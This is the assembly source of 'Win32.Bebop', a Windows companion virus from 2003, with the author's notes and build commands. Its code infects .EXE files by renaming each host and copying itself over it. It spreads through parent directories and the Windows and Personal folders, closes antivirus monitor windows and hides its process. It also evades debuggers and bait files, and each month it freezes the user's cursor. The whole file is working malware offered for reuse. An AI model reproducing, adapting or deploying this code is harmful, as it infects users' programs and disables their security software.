COMMENT#
____________________________________________________________________________________________
                             Win32.Bebop - Virus [Companion]
                                  coded by -DiA- (c)03
				         GermanY
____________________________________________________________________________________________


Intro: 
   Yeah! My new creature. This is a Companion Virus (what else?). Ok, I hope you enjoy
   this, and let the CODE speak...


Disclaimer:
   I am NOT responsible for any damage that you do! You can need the code however you want..
   My motherlanguage is not English, I hope you understand what I mean.                      
   Feel FREE to write any Comments to                                                        
                                       DiA_hates_machine@gmx.de


Infection:
   -infect current directory
   -travel directory's downwards and infect them all
   -go to the Windows folder and infect them
   -go to the Personal folder and infect them
   -infect twenty files per run
   -don't infect again


Features:
   -Anti-Debug
   -Anti-AV-Monitors
   -Anti-Bait


Payload:
   -on the first day every month
   -first show a little message
   -after that the cursor is very slow
   -workz with a thread


Greetz:
   Industry    - m8! See on rRLF 3
   Monochrom   - thanx for TASM32, you see... ;)
   Weed	       - thanx for all, my little ganja
   MyCrew      - Next month, HARDCORE at Skatehall! Rock on.
   ??????      - and to the fucker that send me two or three mails: "Be a Internet Million..
                 "  FUCK YOU, YOU STUPID MOTHERFUCKER! Don't send me mail's, Son of a Bitch!


First Generation:
   ;-----cut-----Bebop666.asm---------------------------------------------------------------
   .386
   .model flat
   jumps

   extrn MessageBoxA	:PROC
   extrn ExitProcess	:PROC

   .data
   oTitle	db 'Win32.Bebop - Virus - First Generation',0
   oMsg	        db 'Yo dood, this is only the first generation',10,13
	        db 'from the Bebop - Virus. Have fun, now you',10,13
	        db 'are infected...',10,13,10,13
	        db '     coded by DiA 03 GermanY',0

   .code
   FirstGen:
   push 16
   push offset oTitle
   push offset oMsg
   push 0
   call MessageBoxA

   push 0
   call ExitProcess

   end FirstGen
   ;-----cut--------------------------------------------------------------------------------


Compile:
   First Gen->
      TASM32 /z /ml /m3 Bebop666,,;
      TLINK32 -Tpe -c -aa Bebop666,Bebop666,, import32.lib
      rename Bebop666.EXE Bebop.SYS

   Virus    ->
      TASM32 /z /ml /m3 Bebop,,;
      TLINK32 -Tpe -c -aa Bebop,Bebop,, import32.lib

   [Bebop.EXE and Bebop.SYS must be in one directory]


Ok, that's it! I write many comment's in the code...
    ...HAVE FUN and read my tut's! :)

____________________________________________________________________________________________
____________________________________________________________________________________________
#


;-------------------------------------------------------------------------------------------
;-----HEAD----------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
.386
.model flat
jumps
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Needed API's--------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
extrn IsDebuggerPresent		:PROC
extrn GetCurrentProcessId	:PROC
extrn RegisterServiceProcess	:PROC
extrn GetCommandLineA		:PROC
extrn lstrcpyA			:PROC
extrn CreateProcessA		:PROC
extrn CopyFileA			:PROC
extrn FindFirstFileA		:PROC
extrn FindNextFileA		:PROC
extrn SetCurrentDirectoryA	:PROC
extrn RegOpenKeyExA		:PROC
extrn RegQueryValueExA		:PROC
extrn RegCloseKey		:PROC
extrn FindWindowA		:PROC
extrn PostMessageA		:PROC
extrn GetWindowsDirectoryA	:PROC
extrn GetSystemTime		:PROC
extrn CreateThread		:PROC
extrn CloseHandle		:PROC
extrn GetCursorPos		:PROC
extrn SetCursorPos		:PROC
extrn Sleep			:PROC
extrn MessageBoxA		:PROC
extrn ExitProcess		:PROC
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Nedded DATA's-------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
.data?
FILETIME		STRUC
FT_dwLowDateTime	dd ?
FT_dwHighDateTime	dd ?
FILETIME		ENDS

WIN32_FIND_DATA          label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

SYSTEMTIME:
 wYear			WORD ?
 wMonth            	WORD ?
 wDayOfWeek        	WORD ?
 wDay              	WORD ?
 wHour             	WORD ?
 wMinute           	WORD ?
 wSecond           	WORD ?
 wMilliseconds     	WORD ?

POINT:
 x  			DWORD ?
 y  			DWORD ?


VirusFile	db 260d dup (?)
HostFile	db 260d dup (?)
TargetFile	db 260d dup (?)

ProcessInfo	dd 4 dup (?)
StartupInfo	dd 4 dup (?)

PersonalFolder	db 260d dup (?)
WindowsFolder	db 260d dup (?)

.data
AVP		db 'AVP Monitor',0
McAfee		db 'McAfee VShield',0
Solomon		db 'SCAN32',0
FProt		db 'FP-WIN',0
Norton		db 'NAVAPW32',0

FindHandle	dd 0
RegHandle	dd 0
lpType		dd 0
ThreadID	dd 0

FileMask	db '*.EXE',0
FileCounter	db 20

Size		dd 260d

ShellFolders	db '.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
Personal	db 'Personal',0

oTitle		db 'Win32.Bebop - Virus',0
oMsg		db 'Yeah! Bebop get''s you. Don''t be angry, this nice',10,13
		db 'Virus don''t have any DESTRUCTIVE CODE!',10,13
		db 'Or for stupid people: Wait a while, next day the',10,13
		db 'Bebop-Virus go away...',10,13,10,13
		db '   Win32.Bebop coded by DiA (c)2003 [GermanY]',0
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Win32.Bebop starts--------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
.code
Bebop:
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Fuck some AV-Monitors-----------------------------------------------------------------
;-------------------------------------------------------------------------------------------
call AntiDebugger			;check for debugger

mov esi,offset AVP
call KillMonitor			;kill the window

mov esi,offset McAfee
call KillMonitor			;kill the window

mov esi,offset Solomon
call KillMonitor			;kill the window

mov esi,offset FProt
call KillMonitor			;kill the window

mov esi,offset Norton
call KillMonitor			;kill the window
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Hide the Bebop Process----------------------------------------------------------------
;-------------------------------------------------------------------------------------------
call GetCurrentProcessId		;get id to hide the Bebop

push 1					;register as "SystemService"
push eax				;ProcessID
call RegisterServiceProcess
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Restore Hostname & Run Host-----------------------------------------------------------
;-------------------------------------------------------------------------------------------
call GetCommandLineA			;looks like "C:\MyC00lPr0gZ\veryCool\Fucking.EXE"

inc eax					;fuck the "
push eax
push offset VirusFile			;copy it to VirusFile to work with it
call lstrcpyA				;copy the string

mov esi,offset VirusFile
call GetPoint				;get the point (...ddd.EXE") to clear "
mov dword ptr [esi+4],00000000h		;fuck it, now we have the path of the VirusFile

push offset VirusFile			;copy path of VirusFile to
push offset HostFile			;HostFile, to work with it
call lstrcpyA

mov esi,offset HostFile
call GetPoint				;get point to rename it
mov dword ptr [esi],5359532Eh		; SYS. ,now we have the path of the HostFile

call AntiDebugger			;check for debugger

xor eax,eax				;null
push offset ProcessInfo
push offset StartupInfo
push eax
push eax
push 10h				;create a new process
push eax
push eax
push eax
push offset HostFile			;path for HostFile
push offset HostFile			;run this file
call CreateProcessA
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Travel Directorys & Infect them-------------------------------------------------------
;-------------------------------------------------------------------------------------------
mov esi,offset HostFile			;don't need anymore, use it to get the directory
call GetPoint				;first get the point
mov ebx,esi				;first get the path of current dir
call CDdotdot				;-"-
call InfectFiles			;and infect files in this directory

InfectCDdotdot:
call CDdotdot				;cd..
test ebx,ebx				;error code?
jz InfectNext				;if yes search other dir's

call InfectFiles			;infect it!
jmp InfectCDdotdot			;cd.. , infect, cd.. , ...

InfectNext:				;other directorys
call AntiDebugger			;often!

push 260d
push offset WindowsFolder		;save there
call GetWindowsDirectoryA		;easyer to get it with api, not registry

mov esi,offset WindowsFolder		;set directory
call SetDirectory
call InfectFiles			;and infect them

call GetPersonalDir			;infect them too
mov esi,offset PersonalFolder		;to set the directory
call SetDirectory			;set it
call InfectFiles			;infect them
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Payload, if Day 1. of Month-----------------------------------------------------------
;-------------------------------------------------------------------------------------------
push offset SYSTEMTIME			;structure
call GetSystemTime			;get time

cmp word ptr [wDay],1			;first day of mounth?
jne FuckingDebugger			;if not exit

push offset ThreadID			;the ID
push 0
push 0
push offset StopCursor			;the pklace where are the thread
push 0
push 0
call CreateThread

push eax				;close da handle
call CloseHandle			;close it

GetCurrentPos:				;get current cursor pos
push offset POINT			;structure
call GetCursorPos
jmp GetCurrentPos			;again and again
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Exit & stay (sic)---------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
FuckingDebugger:
push 0
call ExitProcess
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Infect Files Procedure----------------------------------------------------------------
;-------------------------------------------------------------------------------------------
InfectFiles:				;procedure
call AntiDebugger			;fuck you!

push offset WIN32_FIND_DATA		;Win32 find data is kewl
push offset FileMask			;'*.EXE',0
call FindFirstFileA			;find first
mov dword ptr [FindHandle],eax		;save da handle

FindNext:
test eax,eax				;error?
jz FindMore				;check other directory's

push offset WFD_szFileName		;copy filename of founded file
push offset TargetFile			;to rename and copy it
call lstrcpyA

xor eax,eax				;null
mov esi,offset TargetFile		;is it bait?
mov edi,esi
mov ecx,48d				;0

CheckBait:				;check for bait
lodsb					;load one byte

CheckNum:				;check for a digit
cmp eax,46d				; point?
je Bait					;don't infect, it's a fucking bait

cmp eax,ecx				;a number?
je ScanNext				;scan next digit

cmp eax,57d				;over 9
ja NoBait				;it's no bait, ...infect them

inc ecx					;check next number (0,1,2,3,4,...)
jmp CheckNum				;again

ScanNext:				;scan next place
stosb					;save the byte (edi,esi +1)
mov ecx,48d				;restore ecx
jmp CheckBait				;check ma

NoBait:					;go on with infection

mov esi,offset TargetFile		;find point to rename
call GetPoint
mov dword ptr [esi],5359532Eh		;rename to .SYS

push 1					;don't copy if file allready exist
push offset TargetFile			;copy to this path and filename (TargetFile.SYS)
push offset WFD_szFileName		;the real name to the fake name
call CopyFileA

test eax,eax				;error -> file already exist
jz FindNextPhile			;jmp

push 0					;copy always
push offset WFD_szFileName		;copy the VirusFile over the real File
push offset VirusFile			;now HostName: xxx.SYS VirusName: xxx.EXE
call CopyFileA

dec byte ptr [FileCounter]		;counter -1
cmp byte ptr [FileCounter],0		;zero?
jz FuckingDebugger			;if yes exist

FindNextPhile:
call AntiDebugger			;antiman

Bait:					;search next file, last was a bait
push offset WIN32_FIND_DATA		;get info from Win32FindData
push dword ptr [FindHandle]		;handle of file we search...
call FindNextFileA
jmp FindNext				;go up!

FindMore:
ret					;return and search in other directory's
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Anti Debug Procedure------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
AntiDebugger:
call IsDebuggerPresent			;check for Debugger
test eax,eax				;if yes jmp to...
jnz FuckingDebugger			;FuckingDebugger:
ret
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Get Point Procedure-------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
GetPoint:				;procedure
cmp byte ptr [esi],'.'			;check for point
jz FoundPoint				;if point, return
inc esi					;if not check next place
jmp GetPoint
FoundPoint:
call AntiDebugger
ret					;return
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----CD.. Procedure------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
CDdotdot:				;procedure
GetSlash:				;'\'
cmp byte ptr [ebx],'\'
jz ClearAfter				;if yes, clear al after the \

cmp byte ptr [ebx],':'			; are we at C:\
jz SetError				;set a error code and exit procedure

dec ebx					;esi -1
jmp GetSlash				;search again

ClearAfter:				;clear all after the slash
inc ebx					;but don't clear \ (needed to travel!)
mov dword ptr [ebx],00000000h		;fuck it all, fuck this world, fuck everything th...
sub ebx,2				;go in front of \

mov esi,offset HostFile			;now a path for the directory cd..

SetDirectory:				;procedure
push esi
call SetCurrentDirectoryA		;set the dir
ret					;return

SetError:				;we are at C:, can't cd.. anymore
xor ebx,ebx				;zero
ret
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Read Personal Directory from Registry Procedure---------------------------------------
;-------------------------------------------------------------------------------------------
GetPersonalDir:				;procedure
push offset RegHandle			;save there the handle
push 001F0000h				;read and write
push 0
push offset ShellFolders		;subkey
push 80000003h				;HKEY_...
call RegOpenKeyExA			;open the subkey

test eax,eax				;error?
jnz RegError				;set error code and return

push offset Size				;260d
push offset PersonalFolder		;save the value there
push offset lpType			;fuck off
push 0
push offset Personal			;value name
push dword ptr [RegHandle]		;handle from subkey
call RegQueryValueExA			;read!

RegError:				;error!
call AntiDebugger

push dword ptr [RegHandle]		;close reg
call RegCloseKey
ret
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Anti AV-Monitor Procedure-------------------------------------------------------------
;-------------------------------------------------------------------------------------------
KillMonitor:
call AntiDebugger

push esi				;offset to monitor name
push 0
call FindWindowA			;find it

test eax,eax				;error?
jz FuckNextMonitor			;return

push 0
push 0
push 12h				;WM_QUIT = kill
push eax				;handle of window
call PostMessageA			;shot 'em up

FuckNextMonitor:
ret					;return
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Stop the Cursor Procedure-------------------------------------------------------------
;-------------------------------------------------------------------------------------------
StopCursor:
push 16
push offset oTitle
push offset oMsg
push 0
call MessageBoxA

call AntiDebugger

SleepStop:
push 2000d				;sleep 2sek
call Sleep

xor edx,edx
StopIt:
cmp edx,4000d
je SleepStop

push dword ptr [y]			;y coor
push dword ptr [x]			;x coor
call SetCursorPos			;stop it

inc edx
jmp StopIt				;stop again
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------


;-------------------------------------------------------------------------------------------
;-----Win32.Bebop ends----------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
end Bebop
;-------------------------------------------------------------------------------------------
;-------------------------------------------------------------------------------------------
;------------------------------------------------------------------------Germany2003--------